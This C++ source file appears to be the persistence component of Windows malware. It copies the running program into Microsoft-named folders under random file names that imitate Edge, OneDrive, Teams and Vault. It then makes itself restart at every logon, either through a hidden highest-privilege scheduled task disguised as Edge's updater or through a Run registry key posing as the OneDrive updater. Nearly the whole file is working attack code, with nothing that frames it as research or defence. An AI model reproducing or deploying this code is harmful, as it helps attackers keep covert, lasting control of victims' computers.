#include "Persistence.h"

#include <windows.h>
#include <string>
#include <vector>
#include <random>

namespace persistence {

namespace {

bool isAdmin() {
    BOOL is_admin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup = nullptr;

    if (AllocateAndInitializeSid(
            &NtAuthority,
            2,
            SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0,
            &AdministratorsGroup)) {

        CheckTokenMembership(nullptr, AdministratorsGroup, &is_admin);
        FreeSid(AdministratorsGroup);
    }

    return is_admin == TRUE;
}

std::wstring getExecutablePath() {
    std::vector<wchar_t> path_buf;
    DWORD copied = 0;

    do {
        path_buf.resize(path_buf.size() + MAX_PATH);
        copied = GetModuleFileNameW(NULL, path_buf.data(), static_cast<DWORD>(path_buf.size()));
    } while (copied >= path_buf.size());

    path_buf.resize(copied);
    return std::wstring(path_buf.begin(), path_buf.end());
}

} // anonymous namespace

void establishPersistence() {
    std::wstring sourcePath = getExecutablePath();

    const wchar_t* adminPath = L"%PROGRAMDATA%\\Microsoft\\Windows\\Containers";
    const wchar_t* userPath  = L"%LOCALAPPDATA%\\Microsoft\\Vault";

    std::vector<const wchar_t*> dynamicNames = {
        L"vaultsvc.exe",
        L"edgeupdate.exe",
        L"onedrivesync.exe",
        L"msteamsupdate.exe"
    };

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(0, static_cast<int>(dynamicNames.size() - 1));
    const wchar_t* persistFilename = dynamicNames[distrib(gen)];

    const wchar_t* persistDir = isAdmin() ? adminPath : userPath;

    wchar_t expandedDir[MAX_PATH]{};
    ExpandEnvironmentStringsW(persistDir, expandedDir, MAX_PATH);

    std::wstring persistPath =
        std::wstring(expandedDir) + L"\\" + persistFilename;

    if (lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0) {
        return; // Already running from persistence location
    }

    CreateDirectoryW(expandedDir, nullptr);
    CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE);

    if (isAdmin()) {
        std::wstring command =
            L"schtasks /Create /TN MicrosoftEdgeUpdateTaskMachineUA "
            L"/TR \"" + persistPath +
            L"\" /SC ONLOGON /RL HIGHEST /F";

        STARTUPINFOW si{};
        PROCESS_INFORMATION pi{};
        si.cb = sizeof(si);

        if (CreateProcessW(
                nullptr,
                &command[0],
                nullptr,
                nullptr,
                FALSE,
                CREATE_NO_WINDOW,
                nullptr,
                nullptr,
                &si,
                &pi)) {

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    } else {
        // Use registry run key
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"OneDriveStandaloneUpdater", 0, REG_SZ, (const BYTE*)persistPath.c_str(), static_cast<DWORD>((persistPath.size() + 1) * sizeof(wchar_t)));
            RegCloseKey(hKey);
        }
    }
}

} // namespace persistence
